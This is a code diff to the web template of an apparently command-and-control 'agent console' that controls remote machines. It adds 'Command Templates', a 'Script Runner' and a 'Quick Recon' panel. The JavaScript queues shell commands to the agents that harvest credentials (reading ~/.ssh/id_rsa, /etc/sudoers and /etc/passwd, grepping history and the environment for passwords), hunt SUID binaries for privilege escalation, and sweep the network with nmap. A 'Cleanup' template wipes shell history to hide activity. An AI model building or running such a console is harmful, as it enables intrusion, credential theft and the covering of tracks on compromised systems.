@@ -8,6 +8,120 @@
 
 {% block head %}
 <style>
+  /* Enhanced Top Bar for Agent Console */
+  .console-topbar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+  .console-topbar .os-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    font-size: 11px;
+    font-family: var(--font-mono);
+  }
+  .console-topbar .platform-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    background: rgba(0,212,255,0.1);
+    border: 1px solid rgba(0,212,255,0.3);
+    border-radius: 8px;
+    font-size: 11px;
+    color: var(--accent);
+  }
+  .console-topbar .status-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 14px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    transition: all 0.3s ease;
+  }
+  .console-topbar .status-pill.online {
+    background: rgba(0,245,155,0.15);
+    border: 1px solid rgba(0,245,155,0.4);
+    color: var(--green);
+  }
+  .console-topbar .status-pill.offline {
+    background: rgba(255,61,90,0.15);
+    border: 1px solid rgba(255,61,90,0.4);
+    color: var(--red);
+  }
+  .console-topbar .status-pill .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+  }
+  .console-topbar .status-pill.online .status-dot {
+    background: var(--green);
+    box-shadow: 0 0 8px var(--green);
+    animation: pulse 1.5s infinite;
+  }
+  .console-topbar .status-pill.offline .status-dot {
+    background: var(--red);
+    opacity: 0.6;
+  }
+  .console-topbar .back-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 14px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-size: 12px;
+    text-decoration: none;
+    transition: all 0.2s ease;
+  }
+  .console-topbar .back-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,212,255,0.1);
+  }
+  .console-topbar .quick-action-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 14px;
+    background: rgba(0,212,255,0.15);
+    border: 1px solid rgba(0,212,255,0.4);
+    border-radius: 8px;
+    color: var(--accent);
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    text-decoration: none;
+  }
+  .console-topbar .quick-action-btn:hover {
+    background: rgba(0,212,255,0.25);
+    border-color: var(--accent);
+    box-shadow: 0 4px 15px rgba(0,212,255,0.2);
+    transform: translateY(-1px);
+  }
+  .console-topbar .quick-action-btn.danger {
+    background: rgba(231,76,60,0.15);
+    border-color: rgba(231,76,60,0.4);
+    color: var(--red);
+  }
+  .console-topbar .quick-action-btn.danger:hover {
+    background: rgba(231,76,60,0.25);
+    border-color: var(--red);
+    box-shadow: 0 4px 15px rgba(231,76,60,0.2);
+  }
+
   .console-layout {
     display: grid;
     grid-template-columns: 1fr 260px;
@@ -204,20 +318,13 @@
 
 {% block topbar_actions %}
 <div style="display:flex;align-items:center;gap:8px">
-  <span class="badge os-{{ (agent.os or 'unknown').split()[0]|lower }}">{{ agent.os or '?' }}</span>
-  <span class="badge type">{{ agent.platform_type or 'machine' }}</span>
+  <span class="badge os-{{ (agent.os or 'unknown').split()[0]|lower }}">{{ agent.os[:12] if agent.os else '?' }}</span>
   {% if agent.is_alive %}
-    <span class="status-badge-pill" style="background:rgba(0,245,155,0.1);border:1px solid rgba(0,245,155,0.3);color:var(--green)">
-      <span style="width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;box-shadow:0 0 6px var(--green)"></span>
-      ONLINE
-    </span>
+    <span class="badge" style="background:rgba(0,245,155,0.15);border-color:rgba(0,245,155,0.4);color:var(--green)">● Online</span>
   {% else %}
-    <span class="status-badge-pill" style="background:rgba(255,61,90,0.1);border:1px solid rgba(255,61,90,0.25);color:var(--red)">
-      <span style="width:6px;height:6px;background:var(--red);border-radius:50%;opacity:0.6"></span>
-      OFFLINE
-    </span>
+    <span class="badge" style="background:rgba(255,61,90,0.15);border-color:rgba(255,61,90,0.4);color:var(--red)">○ Offline</span>
   {% endif %}
-  <a href="/devices" class="btn sm" title="Back to devices">← Devices</a>
+  <a href="/devices" class="btn sm">← Back</a>
 </div>
 {% endblock %}
 
@@ -382,6 +489,46 @@
       <h2 class="small">Operator Notes</h2>
       <textarea id="agentNote" rows="4" style="font-size:11px;resize:vertical" placeholder="Notes about this agent…">{{ agent.note or '' }}</textarea>
       <button class="btn sm" style="margin-top:8px;width:100%" onclick="saveNote()">Save Note</button>
+    </div>
+
+    <!-- Command Templates -->
+    <div class="card">
+      <h2 class="small" style="color:var(--accent)">📋 Command Templates</h2>
+      <select id="templateSelect" onchange="loadTemplate()" style="width:100%;padding:6px;background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:11px;margin-bottom:8px">
+        <option value="">Select template...</option>
+        <option value="recon">🔍 Full Recon</option>
+        <option value="persist">🔒 Persistence</option>
+        <option value="lateral">↔️ Lateral Movement</option>
+        <option value="privilege">👑 Privilege Escalation</option>
+        <option value="cleanup">🧹 Cleanup</option>
+      </select>
+      <div id="templatePreview" style="background:rgba(0,0,0,.3);border-radius:6px;padding:8px;font-family:var(--font-mono);font-size:10px;max-height:120px;overflow-y:auto;display:none"></div>
+      <button class="btn sm primary" style="width:100%;margin-top:8px" onclick="executeTemplate()" id="templateRunBtn" disabled>Run Template</button>
+    </div>
+
+    <!-- Script Runner -->
+    <div class="card">
+      <h2 class="small" style="color:var(--yellow)">📜 Script Runner</h2>
+      <textarea id="scriptInput" rows="6" style="width:100%;font-family:var(--font-mono);font-size:10px;background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:6px;color:var(--text);resize:vertical" placeholder="# Enter multi-line script&#10;whoami&#10;id&#10;uname -a"></textarea>
+      <div style="display:flex;gap:6px;margin-top:8px">
+        <button class="btn sm" style="flex:1" onclick="runScript('bash')">▶ Bash</button>
+        <button class="btn sm" style="flex:1" onclick="runScript('python')">🐍 Python</button>
+        <button class="btn sm" style="flex:1" onclick="runScript('ps')">⚡ PS</button>
+      </div>
+    </div>
+
+    <!-- Quick Recon -->
+    <div class="card">
+      <h2 class="small" style="color:var(--green)">🎯 Quick Recon</h2>
+      <button class="quick-btn primary" style="width:100%;margin-bottom:6px" onclick="fullRecon()">🔍 Run Full Recon</button>
+      <div class="cmd-grid">
+        <button class="quick-btn" onclick="quickRecon('network')">🌐 Network</button>
+        <button class="quick-btn" onclick="quickRecon('users')">👥 Users</button>
+        <button class="quick-btn" onclick="quickRecon('processes')">⚙️ Processes</button>
+        <button class="quick-btn" onclick="quickRecon('files')">📁 Files</button>
+        <button class="quick-btn" onclick="quickRecon('privs')">👑 Privs</button>
+        <button class="quick-btn" onclick="quickRecon('creds')">🔑 Creds</button>
+      </div>
     </div>
 
   </div>
@@ -646,5 +793,173 @@ function checkAgentStatus() {
 
 pollTasks();
 setInterval(checkAgentStatus, 15000);
+
+/* ═══════════════════════════════════════════════════════════
+   COMMAND TEMPLATES
+   ═══════════════════════════════════════════════════════════ */
+
+const TEMPLATES = {
+  recon: {
+    name: 'Full Recon',
+    cmds: [
+      'whoami && id',
+      'hostname && uname -a',
+      'ip a || ipconfig /all',
+      'ps aux | head -30',
+      'netstat -an | grep LISTEN',
+      'df -h && free -h',
+      'cat /etc/passwd | tail -20',
+      'find / -perm -4000 2>/dev/null | head -20',
+      'sudo -l 2>/dev/null'
+    ]
+  },
+  persist: {
+    name: 'Persistence',
+    cmds: [
+      'crontab -l 2>/dev/null',
+      'cat /etc/crontab 2>/dev/null',
+      'ls -la /etc/init.d/ 2>/dev/null',
+      'systemctl list-unit-files | grep enabled',
+      'cat ~/.bashrc | tail -20',
+      'cat /etc/profile.d/* 2>/dev/null'
+    ]
+  },
+  lateral: {
+    name: 'Lateral Movement',
+    cmds: [
+      'cat ~/.ssh/known_hosts 2>/dev/null',
+      'ls -la ~/.ssh/ 2>/dev/null',
+      'cat ~/.ssh/config 2>/dev/null',
+      'arp -a 2>/dev/null || arp -An',
+      'nmap -sn 192.168.1.0/24 2>/dev/null || echo "nmap not found"',
+      'cat /etc/hosts'
+    ]
+  },
+  privilege: {
+    name: 'Privilege Escalation',
+    cmds: [
+      'uname -a',
+      'cat /etc/os-release',
+      'find / -perm -4000 2>/dev/null',
+      'find / -perm -2000 2>/dev/null',
+      'sudo -l 2>/dev/null',
+      'cat /etc/sudoers 2>/dev/null',
+      'ls -la /usr/bin/* 2>/dev/null | grep -E "root|wheel"'
+    ]
+  },
+  cleanup: {
+    name: 'Cleanup',
+    cmds: [
+      'history -c 2>/dev/null',
+      'rm -rf /tmp/* 2>/dev/null',
+      '> ~/.bash_history',
+      'echo "Cleanup commands queued"'
+    ]
+  }
+};
+
+let currentTemplate = null;
+
+function loadTemplate() {
+  const select = document.getElementById('templateSelect');
+  const preview = document.getElementById('templatePreview');
+  const runBtn = document.getElementById('templateRunBtn');
+  
+  const name = select.value;
+  if (!name || !TEMPLATES[name]) {
+    preview.style.display = 'none';
+    runBtn.disabled = true;
+    currentTemplate = null;
+    return;
+  }
+  
+  currentTemplate = TEMPLATES[name];
+  preview.innerHTML = currentTemplate.cmds.map(c => `<div style="margin:2px 0;color:var(--text-dim)">→ ${escapeHtml(c)}</div>`).join('');
+  preview.style.display = 'block';
+  runBtn.disabled = false;
+}
+
+function executeTemplate() {
+  if (!currentTemplate) return;
+  
+  const count = currentTemplate.cmds.length;
+  if (!confirm(`Run ${count} commands from "${currentTemplate.name}" template?`)) return;
+  
+  currentTemplate.cmds.forEach((cmd, i) => {
+    setTimeout(() => sendCmd(cmd), i * 500);
+  });
+  
+  showNotification(`✓ Template "${currentTemplate.name}" queued (${count} cmds)`, 'green');
+}
+
+/* ═══════════════════════════════════════════════════════════
+   SCRIPT RUNNER
+   ═══════════════════════════════════════════════════════════ */
+
+function runScript(type) {
+  const script = document.getElementById('scriptInput').value.trim();
+  if (!script) {
+    showNotification('Enter a script first', 'yellow');
+    return;
+  }
+  
+  const lines = script.split('\n').filter(l => l.trim() && !l.trim().startsWith('#'));
+  if (lines.length === 0) {
+    showNotification('No valid commands', 'yellow');
+    return;
+  }
+  
+  let cmd;
+  if (type === 'python') {
+    cmd = `python3 -c "${lines.join('; ')}" 2>/dev/null || python -c "${lines.join('; ')}"`;
+  } else if (type === 'ps') {
+    cmd = lines.join('; ');
+  } else {
+    // Bash - send each line
+    lines.forEach((line, i) => {
+      setTimeout(() => sendCmd(line.trim()), i * 300);
+    });
+    showNotification(`✓ Running ${lines.length} bash commands`, 'green');
+    return;
+  }
+  
+  sendCmd(cmd);
+  showNotification(`✓ Script executed as ${type}`, 'green');
+}
+
+/* ═══════════════════════════════════════════════════════════
+   QUICK RECON
+   ═══════════════════════════════════════════════════════════ */
+
+const RECON_COMMANDS = {
+  network: ['ip a', 'ip route', 'netstat -an | head -30', 'ss -tlnp'],
+  users: ['whoami && id', 'cat /etc/passwd | tail -20', 'last | head -10', 'w'],
+  processes: ['ps aux | head -30', 'top -bn1 | head -20', 'pgrep -la ssh'],
+  files: ['ls -la /', 'ls -la /home', 'ls -la /tmp', 'find /tmp -type f 2>/dev/null | head -20'],
+  privs: ['find / -perm -4000 2>/dev/null', 'sudo -l 2>/dev/null', 'capsh --print 2>/dev/null'],
+  creds: ['cat ~/.ssh/id_rsa 2>/dev/null', 'cat ~/.bash_history | grep -i pass 2>/dev/null | head -10', 'env | grep -i pass']
+};
+
+function fullRecon() {
+  if (!confirm('Run full reconnaissance? This will send multiple commands.')) return;
+  
+  const allCmds = Object.values(RECON_COMMANDS).flat();
+  allCmds.forEach((cmd, i) => {
+    setTimeout(() => sendCmd(cmd), i * 400);
+  });
+  
+  showNotification(`✓ Full recon queued (${allCmds.length} commands)`, 'green');
+}
+
+function quickRecon(type) {
+  const cmds = RECON_COMMANDS[type];
+  if (!cmds) return;
+  
+  cmds.forEach((cmd, i) => {
+    setTimeout(() => sendCmd(cmd), i * 300);
+  });
+  
+  showNotification(`✓ ${type} recon queued (${cmds.length} cmds)`, 'green');
+}
 </script>
 {% endblock %}
